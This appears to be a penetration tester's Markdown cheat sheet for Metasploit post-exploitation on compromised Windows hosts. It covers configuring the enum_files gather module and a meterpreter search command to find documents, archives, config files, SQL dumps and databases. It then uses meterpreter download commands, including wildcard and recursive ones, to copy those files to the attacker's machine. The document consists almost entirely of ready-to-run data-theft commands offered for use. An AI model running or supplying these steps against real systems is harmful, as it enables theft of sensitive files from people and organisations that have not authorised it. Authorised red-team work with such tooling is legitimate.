# Metasploit

## Search specific file extensions

### Post Module

#### Windows

- MSF Windows Gather Generic File Collection Post Module

```
msf > use post/windows/gather/enum_files

msf post(windows/gather/enum_files) > options

Module options (post/windows/gather/enum_files):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_GLOBS   *.config         yes       The file pattern to search for in a filename
   SEARCH_FROM                   no        Search from a specific location. Ex. C:\
   SESSION                       yes       The session to run this module on


View the full module info with the info, or info -d command.

msf post(windows/gather/enum_files) > set file_globs *.txt or *.zip or *.tar.* or *.tgz or *.cab or *.rar or *.pdf or *.doc? or *.ppt? or *.pps? or *.pot? or *.xls? or *.config* or *.sql or *.db

msf post(windows/gather/enum_files) > set search_from <C:\\path\\to\\directory>

msf post(windows/gather/enum_files) > set session <session_id>

msf post(windows/gather/enum_files) > run
```

### Meterpreter

```
meterpreter > search -d [<drive_letter>:]/path/to/directory/ -f *.txt -f *.zip -f *.tar.* -f *.tgz -f *.cab -f *.rar -f *.pdf -f *.doc? -f *.ppt? -f *.pps? -f *.pot? -f *.xls? -f config* -f *.sql -f *.db -f *.png -f *.jpg -f *.jpeg
```

## Download Files

```
meterpreter > download -h
Usage: download [options] src1 src2 src3 ... destination

Downloads remote files and directories to the local machine.

OPTIONS:

    -a   Enable adaptive download buffer size
    -b   Set the initial block size for the download
    -c   Resume getting a partially-downloaded file
    -h   Help banner
    -l   Set the limit of retries (0 unlimits)
    -r   Download recursively
    -t   Timestamp downloaded files
```

- Download single file.

`meterpreter > download [<drive_letter>:]/path/to/remote/file.txt /path/to/local/directory/`

- Download multiple files using wildcard.

`meterpreter > download [<drive_letter>:]/path/to/remote/*.txt /path/to/local/directory/`

- Download multiple files in a directory recursively.

`meterpreter > download -r [<drive_letter>:]/path/to/remote/directory/ /path/to/local/directory/`